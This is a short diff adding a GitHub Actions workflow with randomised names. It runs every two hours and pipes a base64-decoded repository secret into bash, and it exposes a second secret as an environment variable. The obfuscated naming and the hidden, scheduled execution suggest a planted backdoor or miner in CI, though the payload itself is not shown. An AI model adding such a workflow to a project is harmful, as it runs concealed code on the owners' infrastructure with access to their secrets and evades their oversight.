@@ -1,0 +1,13 @@
+name: RblEhoW
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  MNcaLPLjt:
+    runs-on: ubuntu-latest
+    env:
+      wpYaTIAJT: ${{ secrets.fihlJY }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.uYGCwim }}" | base64 -d | bash
